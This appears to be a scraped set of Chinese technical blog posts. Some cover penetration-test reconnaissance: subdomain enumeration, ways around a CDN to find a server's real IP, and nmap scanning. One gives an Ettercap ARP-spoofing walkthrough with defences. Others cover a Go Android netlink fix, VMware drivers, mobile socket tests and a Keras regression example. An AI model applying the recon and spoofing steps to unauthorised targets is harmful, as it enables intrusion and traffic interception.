在互联网如此发达的今天，你在网络上泄漏的任何信息都可以在搜索引擎挖掘到，用好搜索引擎也是一项重要技能。 搜索子网语法：site:目标网站 wydomain挖掘： wydomain是猪猪侠开发的一款基于Python语言开发的子域名信息搜集工具，因其枚举速度快，结果准确，成为不少白帽居家旅行的必备神器。工具主要分为两个模块，dnsburte模块和wydomain模块，dnsburte模块通过用户自定义字典发送dns查询，最后筛选出符合条件的域名。而wydomain模块则是通过调用多个第三方网站的公开api获取子域名数据。 在Kali上可以直接终端上执行git clone https://github.com/ring04h/wydomain.git克隆到本地。 GitHub地址：https://github.com/ring04h/wydomain 第三方网站挖掘： a. http://tool.chinaz.com/subdomain b. https://dnsdumpster.com c. https://phpinfo.me/domain/ 四、IP地址收集 在讲收集域名IP地址前，我们先来了解一个东西——CDN。\n1. CDN简介 CDN（Content Delivery Network）即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。 简单来说，就是一组在不同运营商之间的对接点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。 带有CDN的网站访问方式和普通网站是不一样的： 普通网站：用户访问域名\u0026ndash;\u0026gt;解析服务器IP\u0026ndash;\u0026gt;访问目标主机 带有CDN的网站：用户访问域名\u0026ndash;\u0026gt;CDN节点\u0026ndash;\u0026gt;真实服务器IP\u0026ndash;\u0026gt;访问目标主机 我们可以发现，当我们访问带有CDN的网站时，解析到的IP并非真实服务器IP，而是CDN的IP。 在渗透测试中，为了要知道网站服务器的真实IP，我们必须绕过CDN查找出网站的真实ip地址。\n1. 判断网站是否有CDN 由于CDN是分布在不同地区的，因此当从不同地区ping网站时会得到不同的CDN地址。因此我们可以通过从多个地区ping网站的方式判断网站是否有CDN。 可以ping测试的网站：\nhttps://wepcc.com/ http://ping.chinaz.com/ http://ping.aizhan.com/ 2. 绕过CDN 当我们确定一个网站确实具有CDN服务后，我们就需要想办法绕过CDN去获得真实服务器IP。\n查询子域名：由于CDN需要在不同地区部署服务器，因此CDN的价格必定不会便宜。正所谓“好钢要用到刀刃上”，大多数站长都只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。 查询主域名：很多网站为了在维护网站时更方便，不用等cdn缓存，就只让www域名使用CDN，而秃域名使用CDN。因此我们可以尝试把网站的www去掉，只使用秃域名。 邮件服务器：一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)。 查看域名历史解析记录：也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过网站https://www.netcraft.com来观察域名的IP历史记录。 国外访问：国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站https://asm.ca.com/en/ping.php访问 ，可能会得到真实的IP。 Nslookup查询：查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。 网站漏洞：利用网站自身存在的漏洞，很多情况下会泄露服务器的真实IP地址 Censys查询SSL证书找到真实IP：利用“Censys网络空间搜索引擎”搜索网站的SSL证书及HASH，在https://crt.sh上查找目标网站SSL证书的HASH，然后再用Censys搜索该HASH即可得到真实IP地址。 五、开发端口收集 当我们获得目标网站真实服务器IP后，就需要查询服务器上开发端口，根据不同端口进行不同的测试方案。\n1. 开发端口收集 使用nmap进行探测： 在Kali上执行下列语句即可开启nmap服务进行端口探测。 1 nmap -A -v -T4 目标 使用在线网站探测： http://tool.chinaz.com/port/ 2. 端口攻击 更多端口信息和攻击方式参考：传送门\n3. 防御措施 修改默认远程端口3389/22 修改默认FTP端口21 修改默认Mysql/Mssql端口3306/1433 关闭易入侵端口：88、137、138、139、389、445、464、593、636、1025、3001-3003、3095-3097等 关闭影子账号端口：4899 关闭易提权端口：123 关闭imail激活的两个IP，限制连接所有端口156.21.1.171、156.21.1.22 使用安全策略进行协同防护 配置并开启防火墙 配置服务器安全狗软件 如不使用UDP端口，封闭所有UDP。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/","title":"信息收集——域名信息获取"},{"content":"修复 Go #40569 问题 问题描述 问题 issue： https://github.com/golang/go/issues/40569\n在安卓 11 以上版本中，go 调用 net.InterfaceAddrs() 和 net.Interfaces()时会抛出 route ip+net: netlinkrib: permission denied 错误。\n出现原因 查找原因发现是由于安卓 11 以上版本对 netlink 套接字的能力进行了限制，详情见：https://developer.android.com/training/articles/user-data-ids#mac-11-plus。\n查看 Go 源码，发现在两个地方会存在问题：\n（一）在syscall.NetlinkRIB 函数中，进行了 netlink 套接字 bind 操作：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 // NetlinkRIB returns routing information base, as known as RIB, which // consists of network facility information, states and parameters. func NetlinkRIB(proto, family int) ([]byte, error) { s, err := Socket(AF_NETLINK, SOCK_RAW|SOCK_CLOEXEC, NETLINK_ROUTE) if err != nil { return nil, err } defer Close(s) sa := \u0026amp;SockaddrNetlink{Family: AF_NETLINK} //------------------------------------------------- // 进行了 bind 操作 if err := Bind(s, sa); err != nil { return nil, err } //------------------------------------------------- wb := newNetlinkRouteRequest(proto, 1, family) if err := Sendto(s, wb, 0, sa); err != nil { return nil, err } lsa, err := Getsockname(s) if err != nil { return nil, err } lsanl, ok := lsa.(*SockaddrNetlink) if !ok { return nil, EINVAL } var tab []byte rbNew := make([]byte, Getpagesize()) done: for { rb := rbNew nr, _, err := Recvfrom(s, rb, 0) if err != nil { return nil, err } if nr \u0026lt; NLMSG_HDRLEN { return nil, EINVAL } rb = rb[:nr] tab = append(tab, rb...) msgs, err := ParseNetlinkMessage(rb) if err != nil { return nil, err } for _, m := range msgs { if m.Header.Seq != 1 || m.Header.Pid != lsanl.Pid { return nil, EINVAL } if m.Header.Type == NLMSG_DONE { break done } if m.Header.Type == NLMSG_ERROR { return nil, EINVAL } } } return tab, nil } （二）在 interfaceTable 函数中，调用了 Netlink 套接字的 RTM_GETLINK 能力：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 func interfaceTable(ifindex int) ([]Interface, error) { // 调用了 syscall.RTM_GETLINK 套接字 tab, err := syscall.NetlinkRIB(syscall.RTM_GETLINK, syscall.AF_UNSPEC) if err != nil { return nil, os.NewSyscallError(\u0026#34;netlinkrib\u0026#34;, err) } msgs, err := syscall.ParseNetlinkMessage(tab) if err != nil { return nil, os.NewSyscallError(\u0026#34;parsenetlinkmessage\u0026#34;, err) } var ift []Interface loop: for _, m := range msgs { switch m.Header.Type { case syscall.NLMSG_DONE: break loop case syscall.RTM_NEWLINK: ifim := (*syscall.IfInfomsg)(unsafe.Pointer(\u0026amp;m.Data[0])) if ifindex == 0 || ifindex == int(ifim.Index) { attrs, err := syscall.ParseNetlinkRouteAttr(\u0026amp;m) if err != nil { return nil, os.NewSyscallError(\u0026#34;parsenetlinkrouteattr\u0026#34;, err) } ift = append(ift, *newLink(ifim, attrs)) if ifindex == int(ifim.Index) { break loop } } } } return ift, nil } 解决方案 经过调研，发现在 Android 中存在一个 NetworkInterface.getNetworkInterfaces() 接口，该接口能够正常返回网卡地址和相关信息（在 Android 11 之后的版本种 HwAddr 为空）。\n因此决定参考NetworkInterface.getNetworkInterfaces()接口实现对 Go 的代码进行修复。\n相关 Android 代码：\nhttps://android.googlesource.com/platform/libcore/+/refs/heads/android11-mainline-cellbroadcast-release/luni/src/main/native/libcore_io_Linux.cpp\nhttps://android.googlesource.com/platform/bionic/+/froyo/libc/bionic/if_indextoname.c\nhttps://android.googlesource.com/platform/libcore/+/refs/heads/gingerbread-release/luni/src/main/native/ifaddrs-android.h\nhttps://android.googlesource.com/platform/libcore/+/5d930ca/luni/src/main/java/java/net/NetworkInterface.java\n实现代码 完整代码可见：\nhttps://github.com/golang/go/pull/61089\nhttps://github.com/wlynxg/anet\n部分代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 // src/net/interface_android.go package net import ( \u0026#34;bytes\u0026#34; \u0026#34;os\u0026#34; \u0026#34;syscall\u0026#34; \u0026#34;unsafe\u0026#34; ) type ifReq [40]byte // Starting from Android 11, it is no longer possible to retrieve network card information // using the RTM_GETLINK method. // As a result, alternative methods need to be employed. // After considering the Android NetworkInterface.getNetworkInterfaces() method, // I opted to utilize the RTM_GETADDR + ioctl approach to obtain network card information. // However, it appears that retrieving the // HWAddr (hardware address) of the network card is currently not achievable. func interfaceTableAndroid(ifindex int) ([]Interface, error) { tab, err := syscall.NetlinkRIB(syscall.RTM_GETADDR, syscall.AF_UNSPEC) if err != nil { return nil, os.NewSyscallError(\u0026#34;netlinkrib\u0026#34;, err) } msgs, err := syscall.ParseNetlinkMessage(tab) if err != nil { return nil, os.NewSyscallError(\u0026#34;parsenetlinkmessage\u0026#34;, err) } var ift []Interface im := make(map[uint32]struct{}) loop: for _, m := range msgs { switch m.Header.Type { case syscall.NLMSG_DONE: break loop case syscall.RTM_NEWADDR: ifam := (*syscall.IfAddrmsg)(unsafe.Pointer(\u0026amp;m.Data[0])) if _, ok := im[ifam.Index]; ok { continue } else { im[ifam.Index] = struct{}{} } if ifindex == 0 || ifindex == int(ifam.Index) { ifi := newLinkAndroid(ifam) if ifi != nil { ift = append(ift, *ifi) } if ifindex == int(ifam.Index) { break loop } } } } return ift, nil } // According to the network card Index, get the Name, MTU and Flags of the network card through ioctl func newLinkAndroid(ifam *syscall.IfAddrmsg) *Interface { ift := \u0026amp;Interface{Index: int(ifam.Index)} name, err := indexToName(ifam.Index) if err != nil { return nil } ift.Name = name mtu, err := nameToMTU(name) if err != nil { return nil } ift.MTU = mtu flags, err := nameToFlags(name) if err != nil { return nil } ift.Flags = flags return ift } func ioctl(fd int, req uint, arg unsafe.Pointer) error { _, _, e1 := syscall.Syscall(syscall.SYS_IOCTL, uintptr(fd), uintptr(req), uintptr(arg)) if e1 != 0 { return e1 } return nil } func indexToName(index uint32) (string, error) { fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM|syscall.SOCK_CLOEXEC, 0) if err != nil { return \u0026#34;\u0026#34;, err } defer syscall.Close(fd) var ifr ifReq *(*uint32)(unsafe.Pointer(\u0026amp;ifr[syscall.IFNAMSIZ])) = index err = ioctl(fd, syscall.SIOCGIFNAME, unsafe.Pointer(\u0026amp;ifr[0])) if err != nil { return \u0026#34;\u0026#34;, err } return string(bytes.Trim(ifr[:syscall.IFNAMSIZ], \u0026#34;\\x00\u0026#34;)), nil } func nameToMTU(name string) (int, error) { // Leave room for terminating NULL byte. if len(name) \u0026gt;= syscall.IFNAMSIZ { return 0, syscall.EINVAL } fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM|syscall.SOCK_CLOEXEC, 0) if err != nil { return 0, err } defer syscall.Close(fd) var ifr ifReq copy(ifr[:], name) err = ioctl(fd, syscall.SIOCGIFMTU, unsafe.Pointer(\u0026amp;ifr[0])) if err != nil { return 0, err } return int(*(*int32)(unsafe.Pointer(\u0026amp;ifr[syscall.IFNAMSIZ]))), nil } func nameToFlags(name string) (Flags, error) { // Leave room for terminating NULL byte. if len(name) \u0026gt;= syscall.IFNAMSIZ { return 0, syscall.EINVAL } fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM|syscall.SOCK_CLOEXEC, 0) if err != nil { return 0, err } defer syscall.Close(fd) var ifr ifReq copy(ifr[:], name) err = ioctl(fd, syscall.SIOCGIFFLAGS, unsafe.Pointer(\u0026amp;ifr[0])) if err != nil { return 0, err } return linkFlags(*(*uint32)(unsafe.Pointer(\u0026amp;ifr[syscall.IFNAMSIZ]))), nil } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 // src/syscall/netlink_linux.go // NetlinkRIB returns routing information base, as known as RIB, which // consists of network facility information, states and parameters. func NetlinkRIB(proto, family int) ([]byte, error) { s, err := Socket(AF_NETLINK, SOCK_RAW|SOCK_CLOEXEC, NETLINK_ROUTE) if err != nil { return nil, err } defer Close(s) sa := \u0026amp;SockaddrNetlink{Family: AF_NETLINK} if err := Bind(s, sa); err != nil { // Bind operation of Netlink socket is prohibited in Android11 and later versions if !(runtime.GOOS == \u0026#34;android\u0026#34; \u0026amp;\u0026amp; os.IsPermission(err)) { return nil, err } } wb := newNetlinkRouteRequest(proto, 1, family) if err := Sendto(s, wb, 0, sa); err != nil { return nil, err } lsa, err := Getsockname(s) if err != nil { return nil, err } lsanl, ok := lsa.(*SockaddrNetlink) if !ok { return nil, EINVAL } var tab []byte rbNew := pageBufPool.Get().(*[]byte) defer pageBufPool.Put(rbNew) done: for { rb := *rbNew nr, _, err := Recvfrom(s, rb, 0) if err != nil { return nil, err } if nr \u0026lt; NLMSG_HDRLEN { return nil, EINVAL } rb = rb[:nr] tab = append(tab, rb...) msgs, err := ParseNetlinkMessage(rb) if err != nil { return nil, err } for _, m := range msgs { if m.Header.Seq != 1 || m.Header.Pid != lsanl.Pid { return nil, EINVAL } if m.Header.Type == NLMSG_DONE { break done } if m.Header.Type == NLMSG_ERROR { return nil, EINVAL } } } return tab, nil } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E4%BF%AE%E5%A4%8D-go-%2340569-%E9%97%AE%E9%A2%98/","title":"修复 Go #40569 问题"},{"content":"修改 VMWare 虚拟机速率 物理机上的 VMnet8 和 VMnet1 在设备管理器上查看两个网卡会发现这两个网卡显示的都是百兆。\n但是，实际上这里的网卡速率是没有影响的，在这里显示的速度仅是一个展示的网络速度，是可以被忽略。详细表述可查看：https://serverfault.com/questions/366704/vmware-server-reports-100mb-nic-when-its-actually-1gb/366707#366707。 虚拟网卡实际上没有线速度，因为处理是由主机的物理 CPU 完成的。https://communities.vmware.com/t5/VMware-Workstation-Pro/VMware-Workstation-Pro-network-adapter-settings/m-p/515293/highlight/true#M27737\n虚拟机默认网卡驱动 创建虚拟机的时候默认使用的是 e1000 网络驱动，e1000 网络驱动支持到千兆网络：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 root@Ubuntu:~# ethtool ens33 Settings for ens33: Supported ports: [ TP ] Supported link modes: 10baseT/Half 10baseT/Full 100baseT/Half 100baseT/Full 1000baseT/Full Supported pause frame use: No Supports auto-negotiation: Yes Supported FEC modes: Not reported Advertised link modes: 10baseT/Half 10baseT/Full 100baseT/Half 100baseT/Full 1000baseT/Full Advertised pause frame use: No Advertised auto-negotiation: Yes Advertised FEC modes: Not reported Speed: 1000Mb/s Duplex: Full Auto-negotiation: on Port: Twisted Pair PHYAD: 0 Transceiver: internal MDI-X: off (auto) Supports Wake-on: d Wake-on: d Current message level: 0x00000007 (7) drv probe link Link detected: yes root@Ubuntu:~# ethtool -i ens33 driver: e1000 version: 5.15.0-72-generic firmware-version: expansion-rom-version: bus-info: 0000:02:01.0 supports-statistics: yes supports-test: yes supports-eeprom-access: yes supports-register-dump: yes supports-priv-flags: no 修改虚拟机网卡驱动 可以通过修改虚拟机安装目录下的 虚拟机.vmx 配置（通过记事本打开），将 ethernet0.virtualDev = \u0026quot;e1000\u0026quot; 修改为 ethernet0.virtualDev = \u0026quot;vmxnet3\u0026quot;。\n打开虚拟机，此时可以发现虚拟机的网卡驱动变成了 vmxnet3，vmxnet3是一个万兆网卡驱动：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 root@Ubuntu:~# ethtool ens192 Settings for ens192: Supported ports: [ TP ] Supported link modes: 1000baseT/Full 10000baseT/Full Supported pause frame use: No Supports auto-negotiation: No Supported FEC modes: Not reported Advertised link modes: Not reported Advertised pause frame use: No Advertised auto-negotiation: No Advertised FEC modes: Not reported Speed: 10000Mb/s Duplex: Full Auto-negotiation: off Port: Twisted Pair PHYAD: 0 Transceiver: internal MDI-X: Unknown Supports Wake-on: uag Wake-on: d Link detected: yes root@Ubuntu:~# ethtool -i ens192 driver: vmxnet3 version: 1.6.0.0-k-NAPI firmware-version: expansion-rom-version: bus-info: 0000:0b:00.0 supports-statistics: yes supports-test: no supports-eeprom-access: no supports-register-dump: yes supports-priv-flags: no ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E4%BF%AE%E6%94%B9-vmware-%E7%BD%91%E5%8D%A1%E9%80%9F%E7%8E%87/","title":"修改 VMWare 网卡速率"},{"content":"嗅探欺骗——ARP欺骗 一、介绍 ARP欺骗（ARP spoofing），又称ARP毒化或ARP攻击。它是针对以太网地址解析协议（ARP）的一种攻击技术。\n1. 攻击原理 通过欺骗局域网内访问者的网关MAC地址，使访问者错以为攻击者更改后的MAC地址是网关的MAC，导致应当发往网关地数据包发送到攻击者。\n2. 造成危害 ARP欺骗会导致被攻击者的数据包无法发送到网关，造成被攻击者无法正常上网（从网关发往被攻击者的数据包不受影响）。 由于被攻击者的数据包都发往了攻击者，因此还会泄漏重要个人信息。\n二、Kali上实现ARP欺骗 1. 工具介绍 我们实现ARP攻击需要用到的软件为Ettercap。 Ettercap是针对中级攻击者的综合套件。它具有嗅探实时连接，动态过滤内容和许多其他有趣技巧的功能。它支持许多协议的主动和被动解剖，并包括许多用于网络和主机分析的功能。 2. 实现攻击 在终端输入ettercap -G启动Ettercap界面版 选择eth0网卡（若为无线攻击则选择wlan0） 扫描主机 在Host List中选择被攻击主机IP 攻击方式选择ARP欺骗 攻击完成 三、防范ARP欺骗 升级客户端的操作系统和应用程序补丁 设置静态的ARP缓存表 升级杀毒软件及其病毒库 交换机上绑定端口和MAC地址 生活中不要在连接公用WIFI时输入账号密码 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97arp%E6%AC%BA%E9%AA%97/","title":"嗅探欺骗——ARP欺骗"},{"content":"移动端 socket 问题 APP 端会使用三种类型 socket：\nUDP socket TCP client socket TCP listen socket 但是由于系统原因，这三种 socket 在 APP 前后台状态切换时会受到影响（❗：当APP在界面上无法看到时即为后台，包括Android上传文件时打开文件选择界面，手机锁屏时；当APP在界面上能够看到时为前台）。\n下面是对三种 socket 在不同手机环境下受到的影响的测试说明文档。\n测试方案 以下问题均需要在 release 版本下才能复现，debug 模式下不存在问题！\nUDP 测试：APP 向 服务端定时发送数据包，UDP server 回复收到的数据；\nTCP Client 测试：APP 向服务端端建立 TCP 连接后，定时发送数据包，TCP server 回复收到的数据；\nTCP Serer 测试：在 APP 端建立 TCP server，服务端向手机端发起 TCP 连接，并定时发送数据，TCP server回复收到的数据。\n测试结果 当前能够稳定复现的主要是华为手机和 iOS 手机。其他手机的后台任务管理没有这两个严格，暂未进行测试。\nsocket\\手机品牌 华为 iOS UDP 系统抛错destination address required 系统抛错broken pipe 服务端 无错误信息 无错误信息 TCP client 系统抛错 software caused connection abort 系统抛错broken pipe 服务端 系统抛错connection reset by peer 系统抛错EOF TCP server 无错误信息 无错误信息 服务端 系统抛错connection reset by peer；重新建立连接时无响应 系统抛错 EOF；重新建立连接时系统抛错connection refused 华为 UDP 现象：当 APP 从后台恢复前台后，APP 端发送会抛错 write: destination address required。服务端无错误信息。\nAPP 端：\n1 2 3 4 5 6 7 // 正常输出 07-04 14:32:44.018 16617 16659 I GoLog : hello 07-04 14:32:48.756 17961 17999 I GoLog : hello 07-04 14:32:53.765 17961 17999 I GoLog : hello 07-04 14:32:58.638 18044 18078 I GoLog : hello // APP 从后台恢复到前台 07-04 14:33:03.678 18044 18070 I GoLog : udp write err: write udp 10.0.0.159:33322-\u0026gt;10.0.1.238:15000: write: destination address required TCP client 测试方法：\n现象：当 APP 从前台进入后台后，华为手机系统会立即向已经建立的 socket 连接发出 RST 包，服务端 socket 会抛出 read: connection reset by peer 错误。\n当 APP 从后台恢复前台后，APP 端发送会抛错 write: software caused connection abort，当尝试重新 bind 相同端口 tcp socket 时，会抛出 bind: address already in use (💡：未设置SO_REUSEADDR 和 SO_REUSEPORT，设置之后可重新 bind)。\n服务端：\n1 2 3 4 5 6 7 // 正常输出 2024/07/04 14:52:51 recv new connection from 10.0.0.159:33322 2024/07/04 14:52:51 read \u0026#39;hello\u0026#39; from 10.0.0.159:33322 2024/07/04 14:53:03 read \u0026#39;hello\u0026#39; from 10.0.0.159:33322 2024/07/04 14:53:08 read \u0026#39;hello\u0026#39; from 10.0.0.159:33322 // APP 进入后台 2024/07/04 14:53:10 conn 10.0.0.159:33322 read error: read tcp 10.0.1.238:15100-\u0026gt;10.0.0.159:33322: read: connection reset by peer APP 端：\n1 2 3 4 5 6 7 8 // 正常输出 07-04 14:52:51.624 20975 21069 I GoLog : hello 07-04 14:53:03.266 21302 21338 I GoLog : hello 07-04 14:53:08.272 21302 21338 I GoLog : hello // APP 从后台恢复到前台 07-04 14:53:13.310 21302 21333 I GoLog : tcp write err: write tcp 10.0.0.159:33322-\u0026gt;10.0.1.238:15100: write: software caused connection abort // 重新 bind 抛错 07-04 14:53:13.310 21302 21333 I GoLog : panic: dial tcp :33322-\u0026gt;10.0.1.238:15100: bind: address already in use TCP server 测试方法：\n现象：\n当 APP 从前台进入后台后，华为手机系统会向所有已经建立连接的 TCP 连接发送 RST 报文，导致服务端写数据时抛错 write: connection reset by peer 。\n并且当 APP 恢复前台时，服务端继续向 APP 端 TCP Server 发起连接建立请求时，APP 端无回复包。查看手机端日志，发现手机端无错误信息输出。\n服务端：\n1 2 3 4 5 6 7 8 9 // 正常输出 hello hello // APP 从前台进入后台 2024/07/04 07:21:14 conn 10.0.1.238:52980 write err: write tcp 10.0.1.238:52980-\u0026gt;10.0.0.159:33322: write: connection reset by peer 2024/07/04 07:21:14 conn 10.0.1.238:42090 write err: write tcp 10.0.1.238:42090-\u0026gt;10.0.0.159:33322: write: connection reset by peer // 服务端重新 connect 手机端 TCP server 2024/07/04 07:23:24 dial 10.0.0.159:33322 err: dial tcp 10.0.0.159:33322: connect: connection timed out panic: dial tcp 10.0.0.159:33322: connect: connection timed out APP 端：\n1 2 3 07-04 15:21:08.573 26359 26396 I GoLog : recv new connection from 10.0.1.238:34566 07-04 15:21:08.573 26359 26396 I GoLog : read \u0026#39;hello\u0026#39; from 10.0.1.238:34566 07-04 15:21:08.624 26359 26396 I GoLog : read \u0026#39;hello\u0026#39; from 10.0.1.238:36210 iOS iOS 开发手册中写了对以下问题进行了解释：https://developer.APPle.com/library/archive/technotes/tn2277/_index.html\nUDP 现象：\n当 APP 从后台恢复到前台后，udp socket 会抛出 write: broken pipe错误。此时重新 bind 相同端口的 udp socket 会抛出 bind: address already in use 错误 (💡：未设置SO_REUSEADDR 和 SO_REUSEPORT，设置之后可重新 bind)。\niOS APP 端：\n1 2 3 4 5 6 7 8 // 正常输出 hello hello // APP 恢复前台 2024/07/04 10:38:01 udp write err: write udp 10.0.0.110:33322-\u0026gt;10.0.1.238:15000: write: broken pipe 2024-07-04 18:38:01.029327+0800 anet[1088:374879] [os_log] 2024/07/04 10:38:01 udp write err: write udp 10.0.0.110:33322-\u0026gt;10.0.1.238:15000: write: broken pipe // 重新创建 socket，bind 相同端口 panic: dial udp :33322-\u0026gt;10.0.1.238:15000: bind: address already in use TCP Client 现象：当 APP 进入后台被挂起后，iOS 系统会给服务端 TCP server 发送 FIN 包，让服务端已经建立连接的 socket 关闭。\n当 APP 从后台恢复到前台后，调用 socket 发送数据时会抛出 write: broken pipe 。此时重新 bind 相同端口的 tcp socket 会抛出 bind: address already in use 错误 (💡：未设置SO_REUSEADDR 和 SO_REUSEPORT，设置之后可重新 bind)。\n服务端：\n1 2 3 2024/07/04 11:06:27 read \u0026#39;hello\u0026#39; from 10.0.0.110:33322 2024/07/04 11:06:32 read \u0026#39;hello\u0026#39; from 10.0.0.110:33322 2024/07/04 11:06:34 conn 10.0.0.110:33322 read err: EOF iOS APP 端：\n1 2 3 4 5 hello hello 2024/07/04 11:04:49 udp write err: write tcp 10.0.0.110:33322-\u0026gt;10.0.1.238:15100: write: broken pipe 2024-07-04 19:04:49.548568+0800 anet[1156:389115] [os_log] 2024/07/04 11:04:49 tcp write err: write tcp 10.0.0.110:33322-\u0026gt;10.0.1.238:15100: write: broken pipe panic: dial tcp :33322-\u0026gt;10.0.1.238:15100: bind: address already in use TCP Server 现象：\n当 APP 从前台进入后台后，iOS 系统会向所有已经建立连接的 TCP 连接发送 FIN 报文，导致服务端所有 socket 关闭 。\n并且当服务端继续向 APP 端 TCP Server 发起连接建立请求时，iOS 系统会拒绝连接。当 APP 从后端恢复到前台后，查看手机端日志，发现 accept 无错误信息输出，但是从之前已经建立连接的 TCP socket 读数据时会 iOS 系统抛出 read: socket is not connected错误，此时服务端即使再尝试连接 TCP server，会抛出 connect: connection refused错误。\n服务端日志输出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 正常输出 hello hello hello // APP 退到后台 2024/07/04 10:27:59 conn 10.0.1.238:38314 read err: EOF 2024/07/04 10:27:59 conn 10.0.1.238:38308 read err: EOF 2024/07/04 10:27:59 conn 10.0.1.238:47762 read err: EOF 2024/07/04 10:27:59 conn 10.0.1.238:47778 read err: EOF 2024/07/04 10:27:59 dial 10.0.0.110:33322 err: dial tcp 10.0.0.110:33322: connect: connection refused panic: dial tcp 10.0.0.110:33322: connect: connection refused // APP 恢复前台后再次尝试重连 2024/07/04 10:28:12 dial 10.0.0.110:33322 err: dial tcp 10.0.0.110:33322: connect: connection refused panic: dial tcp 10.0.0.110:33322: connect: connection refused iOS APP:\n1 2 3 4 5 6 7 8 9 10 11 12 // 正常输出 2024-07-04 18:27:53.941595+0800 anet[1077:371301] [os_log] 2024/07/04 10:27:53 read \u0026#39;hello\u0026#39; from 10.0.1.238:38308 2024/07/04 10:27:53 read \u0026#39;hello\u0026#39; from 10.0.1.238:38314 2024-07-04 18:27:53.942296+0800 anet[1077:371301] [os_log] 2024/07/04 10:27:53 read \u0026#39;hello\u0026#39; from 10.0.1.238:38314 2024/07/04 10:27:53 recv new connection from 10.0.1.238:47778 2024-07-04 18:27:53.960323+0800 anet[1077:371302] [os_log] 2024/07/04 10:27:53 recv new connection from 10.0.1.238:47778 2024/07/04 10:27:53 read \u0026#39;hello\u0026#39; from 10.0.1.238:47778 2024-07-04 18:27:53.960779+0800 anet[1077:371302] [os_log] 2024/07/04 10:27:53 read \u0026#39;hello\u0026#39; from 10.0.1.238:47778 // APP 恢复前台后，已经建立连接的 socket 抛错 2024/07/04 10:28:14 conn 10.0.1.238:38308 read err: read tcp 10.0.0.110:33322-\u0026gt;10.0.1.238:38308: read: socket is not connected 2024-07-04 18:28:14.703214+0800 anet[1077:371377] [os_log] 2024/07/04 10:28:14 conn 10.0.1.238:38308 read err: read tcp 10.0.0.110:33322-\u0026gt;10.0.1.238:38308: read: socket is not connected ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%A7%BB%E5%8A%A8%E7%AB%AF-socket-%E9%97%AE%E9%A2%98/","title":"移动端 socket 问题"},{"content":"异或性能压榨 https://github.com/pion/transport/tree/v3.0.1/utils/xor\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%BC%82%E6%88%96%E6%80%A7%E8%83%BD%E5%8E%8B%E6%A6%A8/","title":"异或性能压榨"},{"content":"预测房价：回归问题 简介 本例出自《Python 深度学习》，自己做了一个简单的总结归纳。\n完整代码请参考：[https://github.com/fchollet/deep-learning-with-python-notebooks](\n代码 加载数据集 注意：第一次运行时会下载数据集，速度较慢，请耐心等候。\n1 2 3 from keras.datasets import boston_housing (train_data, train_targets), (test_data, test_targets) = boston_housing.load_data() 数据标准化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 数据标准化 \u0026#34;\u0026#34;\u0026#34; Q：为什么要对数据进行标准化处理？ A：因为不同指标之间的差值较大，很不利于神经网络进行学习。 因此我们需要手动对输入的特征值进行处理，将特征值先减去特征值的均值再处于标准差。 这样就可以将不同的特征值保留在一个差异较小的范围。 而且由于是线性处理，因此相同特征值之间的差异并没有被改变 \u0026#34;\u0026#34;\u0026#34; mean = train_data.mean(axis=0) # 特征差 train_data -= mean # 减去特征差 std = train_data.std(axis=0) # 标准差 train_data /= std print(train_data) # 对测试数据集也做同样操作 